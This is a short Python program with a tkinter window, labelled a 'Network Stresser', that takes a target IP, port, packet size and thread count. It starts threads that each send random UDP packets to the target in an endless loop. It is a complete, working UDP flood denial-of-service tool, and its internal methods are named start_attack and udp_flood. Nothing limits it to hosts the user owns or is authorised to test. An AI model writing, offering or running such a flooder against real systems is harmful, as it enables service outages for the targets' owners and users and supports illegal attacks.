
import tkinter as tk
import threading
import socket
import random

class NetworkStresser:
    def __init__(self, root):
        self.root = root
        self.root.title("Network Stresser")
        
        tk.Label(root, text="Target IP:").pack()
        self.ip_entry = tk.Entry(root)
        self.ip_entry.pack()
        
        tk.Label(root, text="Port:").pack()
        self.port_entry = tk.Entry(root)
        self.port_entry.pack()
        
        tk.Label(root, text="Packet Size (bytes):").pack()
        self.size_entry = tk.Entry(root)
        self.size_entry.insert(0, "1024")  # Default size
        self.size_entry.pack()
        
        tk.Label(root, text="Number of Threads:").pack()
        self.thread_entry = tk.Entry(root)
        self.thread_entry.insert(0, "10")  # Default threads
        self.thread_entry.pack()
        
        self.start_button = tk.Button(root, text="Start Stress Test", command=self.start_attack)
        self.start_button.pack()
        
        self.stop_button = tk.Button(root, text="Stop", command=self.stop_attack, state=tk.DISABLED)
        self.stop_button.pack()
        
        self.running = False
    
    def udp_flood(self, ip, port, size):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        packet = random._urandom(size)
        while self.running:
            sock.sendto(packet, (ip, port))
    
    def start_attack(self):
        ip = self.ip_entry.get()
        port = int(self.port_entry.get())
        size = int(self.size_entry.get())
        threads = int(self.thread_entry.get())
        
        self.running = True
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        
        for _ in range(threads):
            thread = threading.Thread(target=self.udp_flood, args=(ip, port, size))
            thread.start()
    
    def stop_attack(self):
        self.running = False
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)

if __name__ == "__main__":
    root = tk.Tk()
    app = NetworkStresser(root)
    root.mainloop()
